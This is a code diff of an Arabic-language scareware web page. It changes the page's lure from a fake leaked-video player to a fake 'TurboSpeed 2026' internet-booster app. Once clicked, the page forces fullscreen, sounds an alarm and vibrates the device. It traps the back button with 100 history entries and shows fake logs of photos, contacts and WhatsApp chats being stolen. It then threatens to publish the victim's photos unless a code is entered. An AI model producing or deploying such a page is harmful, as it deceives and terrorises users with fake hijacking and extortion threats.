@@ -2,81 +2,81 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ شاهد قبل الحذف ⚠️</title>
-
-    <meta property="og:title" content="شاهد: تسريب فيديو خطير جداً قبل حذفه! 😱">
-    <meta property="og:description" content="أكثر من 5 مليون مشاهدة.. شاهد الآن.">
-    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-
+    <title>🚀 TurboSpeed 2026 | تسريع الهاتف والوايفاي</title>
+    <meta property="og:title" content="TurboSpeed 2026: سرّع هاتفك والوايفاي فوراً! 🚀">
+    <meta property="og:description" content="تطبيق مجاني لتسريع الإنترنت وتنظيف الهاتف بنسبة 300%.">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/679/679821.png">
+    
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        body { background-color: #f4f7f6; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; transition: 0.1s; }
+        #fake-ui { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color: white; }
+        .boost-card { background: white; color: #333; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 85%; max-width: 400px; }
+        .boost-btn { background: #00c853; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 1.2rem; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 5px 15px rgba(0,200,83,0.4); }
         
-        /* واجهة التمويه (مشغل الفيديو) */
-        #fake-ui {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; background: #1a1a1a; cursor: pointer;
-        }
-        .play-btn {
-            width: 80px; height: 80px; background: red; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
-        }
-        .play-btn::after {
-            content: ''; border-style: solid; border-width: 15px 0 15px 25px;
-            border-color: transparent transparent transparent white; margin-left: 5px;
-        }
-
-        /* واجهة الرعب (قبضة نصرو) */
-        #horror-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        #horror-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: black; }
         canvas { position: absolute; top: 0; left: 0; z-index: 1; }
-        .box {
-            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
-            border: 3px solid #f00; padding: 40px; text-align: center;
-            box-shadow: 0 0 30px #f00; width: 80%; max-width: 500px; margin: 10% auto;
-        }
-        h1 { color: #f00; font-size: 2rem; text-shadow: 0 0 10px #f00; }
-        .timer { font-size: 4rem; color: #f00; font-weight: bold; margin: 15px 0; }
-        input { padding: 12px; width: 80%; background: #111; border: 1px solid #0f0; color: #0f0; text-align: center; }
-        button.unlock-btn { margin-top: 20px; padding: 12px; background: #f00; color: #fff; border: none; cursor: pointer; width: 85%; font-weight: bold; }
+        .box { position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9); border: 3px solid #f00; padding: 25px; text-align: center; box-shadow: 0 0 50px #f00; width: 85%; max-width: 450px; margin: 10% auto; color: #f00; }
+        .timer { font-size: 4rem; font-weight: bold; margin: 10px 0; text-shadow: 0 0 20px #f00; }
+        .log { font-size: 0.8rem; color: #0f0; text-align: left; height: 60px; overflow: hidden; background: #000; padding: 5px; border: 1px solid #333; margin-bottom: 10px; }
+        input { padding: 12px; width: 80%; background: #111; border: 1px solid #0f0; color: #0f0; text-align: center; margin: 10px 0; }
     </style>
 </head>
 <body>
 
-    <div id="fake-ui" onclick="startTrap()">
-        <div class="play-btn"></div>
-        <h3 style="color: white; margin-top: 20px;">انقر لتشغيل الفيديو المسرب (HD)</h3>
-        <p style="color: #666;">حجم الملف: 45MB - مدة الفيديو: 02:15</p>
+    <div id="fake-ui">
+        <div class="boost-card">
+            <h1 style="color:#1e3c72">TurboSpeed v4.2</h1>
+            <p>تم اكتشاف بطء في اتصال الوايفاي الخاص بك.</p>
+            <button class="boost-btn" onclick="startTrap()">ابدأ تسريع الإنترنت الآن</button>
+        </div>
     </div>
 
     <div id="horror-ui">
         <canvas id="matrix"></canvas>
         <div class="box">
-            <h1>SYSTEM HIJACKED BY NASRO</h1>
+            <h1 style="margin:0;">SYSTEM HIJACKED</h1>
+            <h3 style="color: #fff;">BY NASRO 0948</h3>
             <div class="timer" id="countdown">30:00</div>
-            <p style="color: #fff;">أردت مشاهدة الفضيحة؟ الآن أنت في قبضة نصرو!<br>
-            <span style="color: #f00;">محاولة الهروب = خصم دقيقتين</span></p>
-            <input type="password" id="pass" placeholder="أدخل كود الإلغاء">
-            <button class="unlock-btn" onclick="check()">فك التشفير الآن</button>
+            <div class="log" id="log-screen">جاري بدء عملية الاختراق...</div>
+            <p style="color: #fff; font-size: 0.9rem;">تحذير: جاري رفع ملفات الصور إلى سيرفر نصرو..<br>إغلاق الصفحة = نشر الصور فوراً!</p>
+            <input type="password" id="pass" placeholder="أدخل كود الإيقاف">
+            <button onclick="check()" style="background: #f00; color: white; border: none; padding: 12px; width: 85%; font-weight: bold; cursor: pointer;">إيقاف الرفع</button>
         </div>
     </div>
 
     <audio id="alarm" loop src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
 
     <script>
-        let timeLeft = 1800; // 30 دقيقة
+        let timeLeft = 1800;
         let active = false;
+        const logs = [
+            "Accessing Gallery...", "Finding Private Photos...", "Stealing Contact List...",
+            "Encrypting Database...", "Uploading to Nasro_Server...", "Bypassing Security...",
+            "Extracting WhatsApp Chats...", "Location Tracked: Algerian User..."
+        ];
 
         function startTrap() {
             active = true;
             document.getElementById('fake-ui').style.display = 'none';
             document.getElementById('horror-ui').style.display = 'block';
             document.getElementById('alarm').play();
-            
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
             if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(e=>{});
-            
             startMatrix();
             startTimer();
-            setupEscapeTrap();
+            setupSjail();
+            runLogs();
+        }
+
+        function runLogs() {
+            let i = 0;
+            setInterval(() => {
+                if(active) {
+                    document.getElementById('log-screen').innerHTML += "<br>> " + logs[i % logs.length];
+                    document.getElementById('log-screen').scrollTop = document.getElementById('log-screen').scrollHeight;
+                    i++;
+                }
+            }, 1500);
         }
 
         function startTimer() {
@@ -87,22 +87,26 @@
                     let min = Math.floor(timeLeft / 60);
                     let sec = timeLeft % 60;
                     timerElement.innerText = `${min}:${sec < 10 ? '0' : ''}${sec}`;
-                    if (timeLeft <= 0) {
-                        alert("تم تدمير بياناتك!");
-                        location.reload();
-                    }
                 }
             }, 1000);
         }
 
-        function setupEscapeTrap() {
-            history.pushState(null, null, location.href);
-            window.onpopstate = function () {
+        function setupSjail() {
+            // سجن السجل: حشو 100 رابط لمنع زر الرجوع
+            for (let i = 0; i < 100; i++) {
                 history.pushState(null, null, location.href);
-                timeLeft -= 120; // عقاب: دقيقتين
-                alert("🚨 محاولة هروب! خصمنا دقيقتين من وقتك كعقاب من نصرو!");
+            }
+            window.onpopstate = function () {
+                for (let i = 0; i < 10; i++) history.pushState(null, null, location.href);
+                timeLeft -= 300; // خصم 5 دقائق
+                if (navigator.vibrate) navigator.vibrate([1000, 200, 1000]);
+                document.body.style.backgroundColor = "red";
+                setTimeout(() => { document.body.style.backgroundColor = "black"; }, 150);
+                alert("🚨 قبضة نصرو: محاولة الهروب تسرع عملية نشر صورك! تم خصم 5 دقائق!");
             };
         }
+
+        window.onbeforeunload = function() { if(active) return "تحذير: سيتم نشر ملفاتك فوراً!"; };
 
         function startMatrix() {
             const canvas = document.getElementById('matrix');
@@ -112,7 +116,7 @@
             const drops = Array(Math.floor(canvas.width / 16)).fill(1);
             setInterval(() => {
                 ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = "#0f0"; ctx.font = "16px arial";
+                ctx.fillStyle = "#0f0"; ctx.font = "15px arial";
                 drops.forEach((y, i) => {
                     ctx.fillText(letters[Math.floor(Math.random() * letters.length)], i * 16, y * 16);
                     if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
@@ -121,15 +125,13 @@
             }, 33);
         }
 
-        window.onbeforeunload = function() { if(active) return "لا يمكنك الهرب!"; };
-
         function check() {
             if(document.getElementById('pass').value === "0948") {
-                active = false; window.onbeforeunload = null;
-                alert("نجوت هذه المرة!"); window.location.href = "https://google.com";
+                active = false; alert("تم إلغاء النشر.. نجوت يا محظوظ!");
+                window.location.href = "https://google.com";
             } else {
-                alert("كود خاطئ! تم خصم دقيقة!");
                 timeLeft -= 60;
+                alert("كود خاطئ! تم تسريع الرفع!");
             }
         }
     </script>
